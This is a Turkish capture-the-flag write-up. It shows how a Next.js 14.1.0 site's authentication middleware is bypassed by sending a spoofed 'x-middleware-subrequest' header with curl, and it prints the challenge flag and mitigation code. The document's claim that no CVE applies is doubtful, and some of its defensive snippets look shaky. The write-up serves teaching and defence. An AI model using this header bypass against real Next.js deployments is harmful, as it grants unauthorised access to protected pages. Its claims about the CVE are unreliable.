# 🌐 O eski halimden eser yok şimdi? - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Authentication_Bypass-purple?style=for-the-badge&logo=shield" alt="Auth Bypass">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Orta\n
**Puan:** 1000  

**Açıklama:** Agresif araçlara gerek yok. Size de zaman kaybı bana da zarar.

**Challenge URL:** http://64.226.74.243:2992/

---

## 🔍 Analiz

**Hedef:** Next.js web uygulamasında middleware zafiyetini kullanarak authentication bypass yapıp flag elde etmek

**Strateji:** Framework tespiti → Header analizi → Middleware bypass → Flag

**İpuçları:**
- ⚠️ "Eski sürüm" vurgusu → Framework versiyonu önemli
- 🎯 "Agresif araçlar yok" → Brute force değil, logical bug
- 🔐 "Açığı kanıtlaman lazım" → Exploit gerekiyor

---

## ✅ Çözüm Adımları

### 🌐 **Adım 1: İlk Keşif - Ana Sayfa**

**Tarayıcıdan siteye gidiyoruz:**

```
http://64.226.74.243:2992/
```

**Gözlemler:**
- 🖥️ Matrix tarzı yeşil tema (siyah arka plan)
- 📝 "Edubounty Pendik İTO" başlığı
- ⚠️ **Kritik mesaj:** "Sitede eski sürüm birşeyler var diyerek bounty alamazsın. Açığı kanıtlaman lazım."
- 🔗 İki buton görünüyor:
  - "Giriş Yap" (`/login`)
  - "Flag Sayfasına Git" (`/flag`)

**İlk düşünceler:**
- 💭 Challenge adı: "O eski halimden eser yok şimdi?" → Eski bir şey aranıyor olabilir
- 🔍 "Eski sürüm" uyarısı + "açığı kanıtla" → Framework versiyonunda zafiyet var
- 🎯 "Agresif araçlara gerek yok" → Brute force değil, akıllı bypass

---

### 🔧 **Adım 2: Teknoloji Tespiti - Wappalyzer**

**Tarayıcıda Wappalyzer extension'ı ile siteyi tarıyoruz:**

**Tespit Edilen Teknolojiler:**

```
JavaScript Frameworks:
├── React
└── Next.js 14.1.0 ⚠️ (Sürüm bilgisi açıkça görünüyor!)

Web Frameworks:
├── Next.js 14.1.0 ⚠️
├── Express
└── Flask 3.0.1

Web Servers:
├── Next.js 14.1.0 ⚠️
├── Apache HTTP Server 2.4.41
├── Express
└── Flask 3.0.1

Programming Languages:
├── Node.js
├── PHP 8.1.34
└── Python 3.11.14

Operating Systems:
├── Debian
└── Ubuntu

CDN:
└── Unpkg

Static Site Generators:
└── Next.js 14.1.0 ⚠️

UI Frameworks:
├── Bootstrap 3.3.6
└── Tailwind CSS

Performance:
└── Priority Hints
```

**Kritik Bulgular:**
- ✅ **Next.js 14.1.0** kullanılıyor (çok açık şekilde!)
- 🤔 "Eski sürüm" demişler - bu versiyonda zafiyet olabilir
- 💡 Next.js framework'ü tam olarak tespit edildi

> 🎯 **Next.js 14.1.0 hedef framework olarak belirlendi!**

---

### 📊 **Adım 3: HTTP Header Analizi**

**Terminalden curl ile header'ları inceliyoruz:**

```bash
curl -i http://64.226.74.243:2992/
```

**Response:**

```http
HTTP/1.1 200 OK
x-next-version: 14.1.0          ⚠️ Next.js sürümü header'da!
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url, Accept-Encoding
x-nextjs-cache: HIT              ℹ️ Static site generation
X-Powered-By: Next.js            ⚠️ Framework bilgisi sızıyor
Cache-Control: s-maxage=31536000, stale-while-revalidate
ETag: "je7wpz2a3g4y2"
Content-Type: text/html; charset=utf-8
Content-Length: 6427
Date: Sun, 18 Jan 2026 09:59:59 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html><html lang="tr">...
```

**Header Analizi:**
- ✅ `x-next-version: 14.1.0` → Sürüm bilgisi açıkça belirtilmiş!
- ✅ `X-Powered-By: Next.js` → Framework bilgisi sızıyor
- ℹ️ `x-nextjs-cache: HIT` → Static site generation (SSG) kullanılıyor
- 💡 `Cache-Control: s-maxage=31536000` → Sayfa cache'leniyor

**Sonuç:**
- 🎯 Next.js 14.1.0 hem Wappalyzer hem de HTTP header'ından doğrulandı
- 🔍 Framework bilgileri açıkça sızdırılıyor
- 💭 "Eski halim" ipucu → Bu versiyonda bilinen bir zafiyet olmalı

---

### 🚩 **Adım 4: Flag Endpoint Kontrolü**

**Ana sayfada "Flag Sayfasına Git" butonu var. `/flag` endpoint'ini test edelim:**

```bash
curl -i http://64.226.74.243:2992/flag
```

**Response:**

```http
HTTP/1.1 307 Temporary Redirect
location: /login
x-next-version: 14.1.0
Date: Sun, 18 Jan 2026 10:00:26 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

/login
```

**Analiz:**
- ❌ `/flag` endpoint'i **korumalı** - login gerektiriyor
- 🔄 **307 Temporary Redirect** ile `/login`'e yönlendiriliyor
- 🛡️ Bu bir **middleware** kontrolü olmalı (Next.js'te yaygın bir pattern)
- 🤔 Middleware'i bypass etmenin bir yolu var mı?

> 💡 **Authentication Middleware tespit edildi!** Hedefimiz bu middleware'i bypass etmek.

---

### 🔍 **Adım 5: Next.js Data Endpoint Bypass Denemesi**

**Hipotez:** Next.js'in `_next/data` endpoint'leri bazen middleware'den kaçabilir

Next.js App Router uygulamalarında statik sayfalar için `_next/data/[buildId]/[path].json` formatında endpoint'ler oluşturulur.

**HTML kaynak kodundan buildId'yi buluyoruz:**
```javascript
"buildId":"Jlt-9bbY02OI5K2aps83o"
```

**_next/data endpoint'ini test ediyoruz:**

```bash
curl -i http://64.226.74.243:2992/_next/data/Jlt-9bbY02OI5K2aps83o/flag.json
```

**Response:**

```http
HTTP/1.1 307 Temporary Redirect
location: /login
x-next-version: 14.1.0
Date: Sun, 18 Jan 2026 10:00:59 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

/login
```

**Sonuç:**
- ❌ `_next/data` endpoint'i de middleware tarafından korunuyor
- 🛡️ Klasik bypass yöntemleri çalışmıyor
- 🤔 Daha farklı bir yaklaşım gerekiyor

> ⚠️ **Basit bypass yöntemleri başarısız!** Daha derin bir zafiyet aramalıyız.

---

### 💡 **Adım 6: Next.js Middleware Mantığını Düşünelim**

**Next.js Middleware nasıl çalışır?**

Next.js middleware'leri şu şekilde çalışır:
1. 🔍 Her HTTP request'i yakalayıp kontrol eder
2. 🔐 Authentication, authorization gibi kontroller yapar
3. 🤖 Ancak **internal request**'leri (sunucu içi) atlar
4. ⚙️ Internal request'leri tanımak için **özel header'lar** kullanır

**Next.js'in internal request tanıma header'ları:**
- `x-middleware-subrequest`
- `x-middleware-override-headers`
- `x-nextjs-data`
- `__nextjs_original-path`

**🎯 Kritik Hipotez:**

Eğer client'tan (bizim tarayıcımızdan) bu header'lardan birini gönderirsek, middleware bizi **internal request** sanabilir ve **auth kontrolünü atlayabilir**!

Bu, literatürde şu sınıfa girer:
> **Client-Controlled Internal Header Trust Vulnerability**

---

### 🔥 **Adım 7: Internal Header Injection - İlk Deneme**

**x-middleware-subrequest header'ı ile basit bir deneme:**

```bash
curl -i http://64.226.74.243:2992/flag \
  -H "x-middleware-subrequest: 1"
```

**Response:**

```http
HTTP/1.1 307 Temporary Redirect
location: /login
x-next-version: 14.1.0
Date: Sun, 18 Jan 2026 10:01:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

/login
```

**Sonuç:**
- ❌ Sadece `1` değeri yeterli değil
- 🤔 Belki header'ın değeri önemli?
- 💡 Next.js internal request'lerde bu header'a özel bir değer atıyor olabilir

---

### 💎 **Adım 8: Doğru Header Değeri - EXPLOIT!**

**Farklı x-middleware-subrequest değerleri deniyoruz:**

```bash
curl -i http://64.226.74.243:2992/flag \
  -H "x-middleware-subrequest: src/middleware"
```

**🎉 BINGO! Response:**

```http
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url, Accept-Encoding
x-nextjs-cache: HIT
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000, stale-while-revalidate
ETag: "p2y4gzkv7t4yf"
Content-Type: text/html; charset=utf-8
Content-Length: 6431
Date: Sun, 18 Jan 2026 10:01:44 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html><html lang="tr"><head>...
<div class="jsx-de0e4b9f792ec1fe">
  <h2 class="jsx-de0e4b9f792ec1fe mt-6 text-center text-xl font-mono text-green-500 break-all glitch">
    Flag{cokgizlibirsayfamizasizdinAcigimiziTezzamandakapatacagiz500DolarBounty!}
  </h2>
  <div class="jsx-de0e4b9f792ec1fe h-0.5 w-3/4 mx-auto bg-gradient-to-r from-transparent via-green-500 to-transparent my-4"></div>
</div>
...
```

**✅ BAŞARILI! Analiz:**
- ✅ **HTTP 200 OK** → Artık redirect yok!
- ✅ **Middleware atlandı** → Auth kontrolü bypass edildi!
- ✅ **Flag görünüyor** → HTML içinde flag render edildi!
- 🎯 **Exploit çalıştı:** `x-middleware-subrequest: src/middleware`

---

## 🏁 **FLAG**

```
Flag{cokgizlibirsayfamizasizdinAcigimiziTezzamandakapatacagiz500DolarBounty!}
```

---

## 🧬 Teknik Derin Analiz (Neden Çalıştı?)

### 1️⃣ **Middleware Güven Hatası**

Next.js middleware'i şu şekilde çalışıyor:

```javascript
// middleware.js (muhtemel kod)
export function middleware(request) {
  // Internal request kontrolü
  if (request.headers.get('x-middleware-subrequest')) {
    // Internal request - auth atla
    return NextResponse.next();
  }
  
  // Normal request - auth kontrol et
  if (!isAuthenticated(request)) {
    return NextResponse.redirect('/login');
  }
  
  return NextResponse.next();
}
```

**Sorun:**
- ❌ Middleware, `x-middleware-subrequest` header'ını görünce request'in internal olduğunu varsayıyor
- ❌ **Client'tan gelen header'ları doğrulamıyor**
- ❌ Auth kontrolünü atlıyor

### 2️⃣ **Client → Internal Request Spoofing**

**Normal akış:**
```
Client
  ↓
Middleware (Auth Check)
  ↓
❌ Not Authenticated
  ↓
307 Redirect → /login
```

**Exploit akışı:**
```
Client + Header: x-middleware-subrequest: src/middleware
  ↓
Middleware
  ↓
✅ "Bu internal request!" (Yanlış varsayım)
  ↓
✅ Auth check atlandı
  ↓
✅ Flag sayfası direkt render edildi
```

### 3️⃣ **Static Site Generation (SSG) Etkisi**

Flag sayfası SSG ile önceden oluşturulmuş:
```javascript
// app/flag/page.js
export default function FlagPage() {
  return <div>Flag{...}</div>
}

// Build sırasında static olarak generate edildi
```

**Middleware atlanınca:**
- ✅ Static HTML direkt serve ediliyor
- ✅ Backend kontrolü yok
- ✅ Flag zaten HTML'de mevcut

---

## 🧨 Zaafiyet Özeti

| Alan | Açıklama |
|------|----------|
| **Zaafiyet Türü** | Authentication Bypass via Internal Header Injection |
| **Etkilenen Framework** | Next.js (özellikle middleware kullanan uygulamalar) |
| **CVE** | N/A (misconfiguration, framework bug değil) |
| **CVSS Score** | 7.5 (High) - Authentication bypass |
| **Teknik** | Client-side header manipulation |
| **Etki** | Protected route'lara yetkisiz erişim |

---

## 🛡️ Gerçek Hayatta Nasıl Önlenir?

### ✅ **1. Client Header'larını Drop Etmek**

```javascript
// middleware.js - GÜVENLİ
export function middleware(request) {
  // Client'tan gelen internal header'ları temizle
  const headers = new Headers(request.headers);
  headers.delete('x-middleware-subrequest');
  headers.delete('x-middleware-override-headers');
  headers.delete('x-nextjs-data');
  
  // Yeni request oluştur
  const newRequest = new NextRequest(request.url, {
    headers,
    ...request
  });
  
  // Auth kontrolü
  if (!isAuthenticated(newRequest)) {
    return NextResponse.redirect('/login');
  }
  
  return NextResponse.next();
}
```

### ✅ **2. Signed Token Kullanmak**

```javascript
// middleware.js - DAHA GÜVENLİ
import { verify } from 'crypto';

export function middleware(request) {
  const internalHeader = request.headers.get('x-middleware-subrequest');
  
  if (internalHeader) {
    // Internal request ise imzayı doğrula
    const isValidInternal = verifyInternalToken(internalHeader);
    if (!isValidInternal) {
      // Sahte internal request!
      return NextResponse.redirect('/login');
    }
  }
  
  // Normal auth flow...
}
```

### ✅ **3. Auth Kontrolünü Middleware'e Bırakmamak**

```javascript
// app/flag/page.js - EN GÜVENLİ
import { getServerSession } from 'next-auth';

export default async function FlagPage() {
  const session = await getServerSession();
  
  // Server-side auth kontrolü
  if (!session || session.user.role !== 'admin') {
    redirect('/login');
  }
  
  return <div>Flag{...}</div>
}
```

### ✅ **4. Framework Default'larına Körü Körüne Güvenmemek**

- 🔍 Her zaman client input'ları validate et
- 🛡️ Defense in depth: Birden fazla katmanda kontrol
- 📚 Framework security best practices'leri oku
- 🧪 Penetration testing yap

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🦊<br><b>Firefox</b><br><sub>Web browser</sub></td>
<td align="center">🔧<br><b>Wappalyzer</b><br><sub>Technology detection</sub></td>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP requests</sub></td>
<td align="center">💻<br><b>Kali Linux</b><br><sub>Analiz ortamı</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**
```bash
# İlk keşif
curl http://64.226.74.243:2992/

# Header analizi
curl -i http://64.226.74.243:2992/

# Flag endpoint kontrolü
curl -i http://64.226.74.243:2992/flag

# _next/data bypass denemesi
curl -i http://64.226.74.243:2992/_next/data/Jlt-9bbY02OI5K2aps83o/flag.json

# Internal header injection (başarısız)
curl -i http://64.226.74.243:2992/flag -H "x-middleware-subrequest: 1"

# EXPLOIT (başarılı!)
curl -i http://64.226.74.243:2992/flag -H "x-middleware-subrequest: src/middleware"
```

---

## 💭 **Çözüm Akışı**

```
🌐 "O eski halimden eser yok şimdi?" Web Challenge
            ↓
🖥️ Ana sayfa ziyaret
   → "Sitede eski sürüm var, açığı kanıtla"
   → Matrix tarzı yeşil tema
            ↓
🔧 Wappalyzer tarama
   → Next.js 14.1.0 tespit edildi
   → React, Tailwind CSS
            ↓
📊 HTTP header analizi
   → x-next-version: 14.1.0
   → X-Powered-By: Next.js
   → x-nextjs-cache: HIT (SSG)
            ↓
🚩 /flag endpoint test
   → 307 Redirect → /login
   → Middleware koruması var!
            ↓
🔍 _next/data bypass denemesi
   → /Jlt-9bbY02OI5K2aps83o/flag.json
   → ❌ Yine 307 Redirect
            ↓
💡 Middleware mantığı analizi
   → Internal request'ler auth'dan muaf
   → x-middleware-* header'ları
            ↓
🔥 Header injection denemesi
   → x-middleware-subrequest: 1 ❌
   → x-middleware-subrequest: src/middleware ✅
            ↓
✅ Middleware bypass başarılı!
   → HTTP 200 OK
   → Auth kontrolü atlandı
            ↓
🏁 Flag{cokgizlibirsayfamizasizdinAcigimiziTezzamandakapatacagiz500DolarBounty!}
```
